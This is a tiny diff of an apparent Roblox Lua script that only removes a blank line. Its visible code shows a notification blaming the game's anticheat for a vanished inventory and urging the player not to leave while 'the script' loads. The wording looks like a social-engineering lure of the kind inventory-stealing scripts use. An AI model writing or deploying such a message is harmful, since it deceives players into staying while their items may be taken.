@@ -1,6 +1,5 @@
 local StarterGui = game:GetService("StarterGui")
 
-
 StarterGui:SetCore("SendNotification", {
     Title = "Reminder";
     Text = "Due to the game anticheat, your inventory may not be visible for a while.\nLeaving is unnecessary — please wait while we load the script.";
